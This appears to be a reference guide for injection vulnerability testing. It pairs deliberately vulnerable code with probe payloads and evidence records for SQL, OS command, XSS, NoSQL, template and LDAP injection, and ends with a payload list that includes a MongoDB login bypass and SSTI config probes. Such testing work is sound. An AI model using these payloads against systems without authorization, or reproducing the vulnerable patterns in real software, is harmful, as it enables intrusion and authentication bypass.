# Injection Testing Examples

This file contains comprehensive examples of injection vulnerability testing, organized by injection type.

## Table of Contents
1. [SQL Injection](#sql-injection)
2. [OS Command Injection](#os-command-injection)
3. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
4. [NoSQL Injection](#nosql-injection)
5. [Server-Side Template Injection (SSTI)](#server-side-template-injection-ssti)
6. [LDAP Injection](#ldap-injection)
7. [Test Result Types](#test-result-types)
8. [Common Payloads Reference](#common-payloads-reference)

---

## SQL Injection

### Example 1: Time-Based Blind SQL Injection

**Scenario**: User search endpoint with unparameterized query

**Vulnerability**:
```python
# api/users.py - VULNERABLE
@app.route('/api/users')
def search_users():
    user_id = request.args.get('id')
    query = f"SELECT * FROM users WHERE id = {user_id}"  # No parameterization!
    result = db.execute(query)
    return jsonify(result)
```

**Test**:
1. Baseline: `GET /api/users?id=123` → 200 OK (0.15s)
2. Payload: `GET /api/users?id=123' OR SLEEP(5)--` → 200 OK (5.23s)
3. Detection: Response time increased by ~5 seconds

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_time_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/api/users?id=123",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 0.15,
    "response_hash": "sha256:abc123..."
  },
  "test": {
    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 5.23,
    "response_hash": "sha256:def456..."
  },
  "evidence": "Time-based SQLi: 5.08s delay with SLEEP(5) payload",
  "payload_used": "123' OR SLEEP(5)--"
}
```

---

### Example 2: Error-Based SQL Injection

**Scenario**: Login form with verbose SQL errors

**Vulnerability**:
```python
# api/auth.py - VULNERABLE
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    try:
        result = db.execute(query)
    except Exception as e:
        return jsonify({"error": str(e)}), 500  # Exposes SQL error!
```

**Test**:
1. Baseline: `POST /login` with `username=admin&password=test` → 401
2. Payload: `POST /login` with `username=admin'&password=test` → 500 with SQL error

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_error_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/login",
    "method": "POST",
    "status": 401,
    "response_snippet": "{\"error\":\"Invalid credentials\"}"
  },
  "test": {
    "url": "http://target.com/login",
    "method": "POST",
    "payload": "username=admin'&password=test",
    "status": 500,
    "response_snippet": "{\"error\":\"OperationalError: near \\\"admin\\\": syntax error\"}"
  },
  "evidence": "Error-based SQLi: SQL syntax error exposed in response",
  "payload_used": "admin'"
}
```

---

### Example 3: Boolean-Based Blind SQL Injection

**Scenario**: Product search with injectable WHERE clause

**Vulnerability**:
```python
# api/products.py - VULNERABLE
@app.route('/api/products')
def search_products():
    category = request.args.get('category', '')
    query = f"SELECT * FROM products WHERE category = '{category}' AND active = 1"
    return jsonify(db.execute(query))
```

**Test**:
1. True condition: `GET /api/products?category=electronics' OR '1'='1` → Returns all products
2. False condition: `GET /api/products?category=electronics' OR '1'='2` → Returns only electronics
3. Detection: Content length differs based on condition

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "sql_injection_boolean_based",
  "cwe": "CWE-89",
  "baseline": {
    "url": "http://target.com/api/products?category=electronics",
    "status": 200,
    "content_length": 1523
  },
  "test": {
    "true_condition": {
      "url": "http://target.com/api/products?category=electronics' OR '1'='1",
      "status": 200,
      "content_length": 45892
    },
    "false_condition": {
      "url": "http://target.com/api/products?category=electronics' OR '1'='2",
      "status": 200,
      "content_length": 1523
    }
  },
  "evidence": "Boolean-based SQLi: true condition returned 45892 bytes vs 1523 bytes",
  "payload_used": "electronics' OR '1'='1"
}
```

---

## OS Command Injection

### Example 4: Command Injection via Ping Utility

**Scenario**: Network diagnostic tool executing user input

**Vulnerability**:
```python
# api/network.py - VULNERABLE
@app.route('/api/ping')
def ping_host():
    host = request.args.get('host')
    result = os.popen(f"ping -c 4 {host}").read()  # Shell injection!
    return jsonify({"output": result})
```

**Test**:
1. Baseline: `GET /api/ping?host=127.0.0.1` → 200 OK (0.5s)
2. Payload: `GET /api/ping?host=127.0.0.1; sleep 5` → 200 OK (5.6s)
3. Detection: Response time increased by ~5 seconds

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "os_command_injection",
  "cwe": "CWE-78",
  "baseline": {
    "url": "http://target.com/api/ping?host=127.0.0.1",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 0.52
  },
  "test": {
    "url": "http://target.com/api/ping?host=127.0.0.1; sleep 5",
    "method": "GET",
    "status": 200,
    "response_time_seconds": 5.61
  },
  "evidence": "Command injection: sleep 5 caused 5.09s delay",
  "payload_used": "127.0.0.1; sleep 5"
}
```

---

### Example 5: Command Injection with Output

**Scenario**: File viewer with path injection

**Vulnerability**:
```python
# api/files.py - VULNERABLE
@app.route('/api/view')
def view_file():
    filename = request.args.get('file')
    result = os.popen(f"cat /var/data/{filename}").read()
    return jsonify({"content": result})
```

**Test**:
1. Payload: `GET /api/view?file=test.txt; echo INJECTION_MARKER`
2. Detection: `INJECTION_MARKER` appears in response

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "os_command_injection",
  "cwe": "CWE-78",
  "test": {
    "url": "http://target.com/api/view?file=test.txt; echo INJECTION_MARKER",
    "method": "GET",
    "status": 200,
    "response_snippet": "{\"content\":\"file contents here\\nINJECTION_MARKER\\n\"}"
  },
  "evidence": "Command injection: echo output visible in response",
  "payload_used": "test.txt; echo INJECTION_MARKER"
}
```

---

## Cross-Site Scripting (XSS)

### Example 6: Reflected XSS in Search

**Scenario**: Search results page reflecting user input

**Vulnerability**:
```python
# routes/search.py - VULNERABLE
@app.route('/search')
def search():
    query = request.args.get('q', '')
    results = search_database(query)
    return f"<html><body>Results for: {query}<br/>{results}</body></html>"  # No escaping!
```

**Test**:
1. Payload: `GET /search?q=<script>alert(1)</script>`
2. Detection: Script tag appears unencoded in response

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_reflected",
  "cwe": "CWE-79",
  "test": {
    "url": "http://target.com/search?q=<script>alert(1)</script>",
    "method": "GET",
    "status": 200,
    "response_snippet": "<html><body>Results for: <script>alert(1)</script><br/>..."
  },
  "evidence": "Reflected XSS: <script> tag in response without encoding",
  "payload_used": "<script>alert(1)</script>"
}
```

---

### Example 7: XSS in Attribute Context

**Scenario**: User input reflected inside HTML attribute

**Vulnerability**:
```html
<!-- VULNERABLE -->
<input type="text" value="{{ user_input }}" />
```

**Test**:
1. Payload: `GET /profile?name=" onmouseover="alert(1)`
2. Detection: Event handler injected into attribute

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "xss_attribute_context",
  "cwe": "CWE-79",
  "test": {
    "url": "http://target.com/profile?name=\" onmouseover=\"alert(1)",
    "method": "GET",
    "status": 200,
    "response_snippet": "<input type=\"text\" value=\"\" onmouseover=\"alert(1)\" />"
  },
  "evidence": "XSS in attribute context: onmouseover handler injected",
  "payload_used": "\" onmouseover=\"alert(1)"
}
```

---

## NoSQL Injection

### Example 8: MongoDB Operator Injection

**Scenario**: Login with MongoDB query injection

**Vulnerability**:
```javascript
// api/auth.js - VULNERABLE
app.post('/login', (req, res) => {
    const { username, password } = req.body;
    User.findOne({ username: username, password: password })  // Operators not filtered!
        .then(user => res.json(user));
});
```

**Test**:
1. Baseline: `POST /login` with `{"username":"admin","password":"wrong"}` → 401
2. Payload: `POST /login` with `{"username":"admin","password":{"$ne":""}}` → 200 OK

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "nosql_injection",
  "cwe": "CWE-943",
  "baseline": {
    "url": "http://target.com/login",
    "method": "POST",
    "payload": "{\"username\":\"admin\",\"password\":\"wrong\"}",
    "status": 401
  },
  "test": {
    "url": "http://target.com/login",
    "method": "POST",
    "payload": "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
    "status": 200,
    "response_snippet": "{\"user\":\"admin\",\"role\":\"admin\"}"
  },
  "evidence": "NoSQL injection: $ne operator bypassed authentication",
  "payload_used": "{\"password\":{\"$ne\":\"\"}}"
}
```

---

## Server-Side Template Injection (SSTI)

### Example 9: Jinja2 Template Injection

**Scenario**: Dynamic template rendering with user input

**Vulnerability**:
```python
# routes/greet.py - VULNERABLE
@app.route('/greet')
def greet():
    name = request.args.get('name', 'Guest')
    template = f"Hello, {name}!"
    return render_template_string(template)  # User input in template!
```

**Test**:
1. Payload: `GET /greet?name={{7*7}}`
2. Detection: Response contains `49` (evaluated expression)

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "ssti_jinja2",
  "cwe": "CWE-1336",
  "test": {
    "url": "http://target.com/greet?name={{7*7}}",
    "method": "GET",
    "status": 200,
    "response_snippet": "Hello, 49!"
  },
  "evidence": "SSTI (Jinja2): {{7*7}} evaluated to 49",
  "payload_used": "{{7*7}}"
}
```

---

## LDAP Injection

### Example 10: LDAP Filter Injection

**Scenario**: User lookup with injectable LDAP query

**Vulnerability**:
```python
# api/users.py - VULNERABLE
def find_user(username):
    filter_str = f"(uid={username})"  # No escaping!
    return ldap_conn.search(base_dn, filter_str)
```

**Test**:
1. Baseline: `GET /api/user?name=john` → Returns john's record
2. Payload: `GET /api/user?name=*` → Returns all users

**Evidence**:
```json
{
  "status": "VALIDATED",
  "injection_type": "ldap_injection",
  "cwe": "CWE-90",
  "baseline": {
    "url": "http://target.com/api/user?name=john",
    "status": 200,
    "content_length": 245
  },
  "test": {
    "url": "http://target.com/api/user?name=*",
    "status": 200,
    "content_length": 12847
  },
  "evidence": "LDAP injection: wildcard returned all 52 users vs 1",
  "payload_used": "*"
}
```

---

## Test Result Types

### Example 11: FALSE_POSITIVE (Properly Secured)

**Scenario**: Parameterized SQL query

**Secure Implementation**:
```python
# api/users.py - SECURE
@app.route('/api/users')
def search_users():
    user_id = request.args.get('id')
    query = "SELECT * FROM users WHERE id = ?"
    result = db.execute(query, [user_id])  # Parameterized!
    return jsonify(result)
```

**Test Result**:
```json
{
  "status": "FALSE_POSITIVE",
  "injection_type": "sql_injection",
  "baseline": {
    "url": "http://target.com/api/users?id=123",
    "response_time_seconds": 0.15
  },
  "test": {
    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
    "response_time_seconds": 0.18
  },
  "evidence": "No injection indicators - input properly parameterized"
}
```

---

### Example 12: UNVALIDATED (WAF Blocking)

**Scenario**: Web Application Firewall blocks injection attempts

**Test Result**:
```json
{
  "status": "UNVALIDATED",
  "injection_type": "sql_injection",
  "reason": "WAF blocking injection payloads",
  "test": {
    "url": "http://target.com/api/users?id=123' OR SLEEP(5)--",
    "status": 403,
    "response_snippet": "{\"error\":\"Request blocked by security policy\"}"
  },
  "evidence": "Cannot validate - WAF returns 403 for injection payloads"
}
```

---

### Example 13: PARTIAL (Some Payloads Work)

**Scenario**: Basic filtering bypassed by alternate payloads

**Test**:
1. `' OR SLEEP(5)--` → Blocked (filtered single quotes)
2. `1 OR SLEEP(5)--` → 5 second delay (numeric context injection)

**Test Result**:
```json
{
  "status": "PARTIAL",
  "injection_type": "sql_injection",
  "tests": {
    "quote_payload": {
      "payload": "' OR SLEEP(5)--",
      "status": 400,
      "note": "Single quote filtered"
    },
    "numeric_payload": {
      "payload": "1 OR SLEEP(5)--",
      "response_time_seconds": 5.12,
      "note": "Numeric injection works"
    }
  },
  "evidence": "Partial SQLi: quote filtering bypassed via numeric context",
  "requires_manual_review": true
}
```

---

## Common Payloads Reference

### SQL Injection Payloads

**Time-Based:**
```
' OR SLEEP(5)--
' WAITFOR DELAY '0:0:5'--
' OR pg_sleep(5)--
1; SELECT SLEEP(5)--
```

**Error-Based:**
```
'
"
`
1'1
1 AND 1=CONVERT(int,(SELECT @@version))--
```

**Boolean-Based:**
```
' OR '1'='1
' OR '1'='2
' AND '1'='1
1 OR 1=1
1 AND 1=2
```

### Command Injection Payloads

**Linux:**
```
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& sleep 5
; echo MARKER
| id
```

**Windows:**
```
& ping -n 5 127.0.0.1
| ping -n 5 127.0.0.1
& echo MARKER
```

### XSS Payloads

**Basic:**
```
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Attribute Context:**
```
" onmouseover="alert(1)
' onfocus='alert(1)
" autofocus onfocus="alert(1)
```

**Event Handlers:**
```
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### NoSQL Payloads

**MongoDB:**
```json
{"$gt": ""}
{"$ne": null}
{"$regex": ".*"}
{"$where": "1==1"}
```

### SSTI Payloads

**Detection:**
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

**Jinja2:**
```
{{config}}
{{''.__class__.__mro__}}
```

**Twig:**
```
{{_self.env}}
{{app.request.server.all|join(',')}}
```

---

## CWE Reference

Full list of injection-related CWEs from OWASP A03:2021 and A05:2025 (37 CWEs):

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-20 | Improper Input Validation | Partial |
| CWE-74 | Injection (parent category) | Yes |
| CWE-76 | Improper Neutralization of Equivalent Special Elements | Yes |
| CWE-77 | Command Injection | Yes |
| CWE-78 | OS Command Injection | Yes |
| CWE-79 | Cross-site Scripting (XSS) | Yes |
| CWE-80 | Basic XSS | Yes |
| CWE-83 | XSS in Attributes | Yes |
| CWE-86 | Improper Neutralization of Invalid Characters in Web Pages | Yes |
| CWE-88 | Argument Injection | Yes |
| CWE-89 | SQL Injection | Yes |
| CWE-90 | LDAP Injection | Yes |
| CWE-91 | XML/XPath Injection (Blind XPath) | Yes |
| CWE-93 | CRLF Injection | Yes |
| CWE-94 | Code Injection | Yes |
| CWE-95 | Eval Injection | Yes |
| CWE-96 | Static Code Injection | Partial |
| CWE-97 | SSI Injection | Yes |
| CWE-98 | PHP Remote File Inclusion | Yes |
| CWE-99 | Resource Injection | Partial |
| CWE-103 | Struts: Incomplete validate() Method | No (SAST) |
| CWE-104 | Struts: Form Bean Does Not Extend Validation Class | No (SAST) |
| CWE-112 | Missing XML Validation | Partial |
| CWE-113 | HTTP Response Splitting | Yes |
| CWE-114 | Process Control | Yes |
| CWE-115 | Misinterpretation of Output | Partial |
| CWE-116 | Improper Output Encoding | Yes |
| CWE-129 | Improper Validation of Array Index | No (SAST) |
| CWE-159 | Improper Handling of Invalid Use of Special Elements | Yes |
| CWE-470 | Unsafe Reflection | Partial |
| CWE-493 | Critical Public Variable Without Final Modifier | No (SAST) |
| CWE-500 | Public Static Field Not Marked Final | No (SAST) |
| CWE-564 | Hibernate SQL Injection | Yes |
| CWE-610 | Externally Controlled Reference | Yes |
| CWE-643 | XPath Injection | Yes |
| CWE-644 | HTTP Header Injection | Yes |
| CWE-917 | Expression Language Injection | Yes |

**Additional CWEs (common but not in OWASP Top 10 list):**

| CWE | Name | DAST Testable |
|-----|------|---------------|
| CWE-652 | XQuery Injection | Yes |
| CWE-943 | NoSQL Injection | Yes |
| CWE-1336 | Template Injection (SSTI) | Yes |

**Note:** Some CWEs are primarily detectable via Static Analysis (SAST) rather than Dynamic Testing (DAST). This skill focuses on DAST-testable vulnerabilities.

**Related:** LLM Prompt Injection is covered separately in [OWASP LLM Top 10 - LLM01:2025](https://genai.owasp.org/llmrisk/llm01-prompt-injection/).
